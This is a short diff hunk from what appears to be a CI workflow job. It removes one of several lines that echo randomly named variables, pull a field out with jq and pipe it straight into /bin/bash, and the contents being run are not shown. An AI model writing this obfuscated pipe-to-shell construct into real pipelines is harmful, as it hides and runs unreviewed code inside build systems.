@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
           echo $cq89 | jq -r .zaoea32 | /bin/bash
           echo $j5 | jq -r .wcjeu82334 | /bin/bash
-          echo $ufin96764 | jq -r .dv22 | /bin/bash
           echo $r44125 | jq -r .rk71922 | /bin/bash
           echo $kbbm304 | jq -r .o6 | /bin/bash
           echo $gngh3167 | jq -r .u91697 | /bin/bash
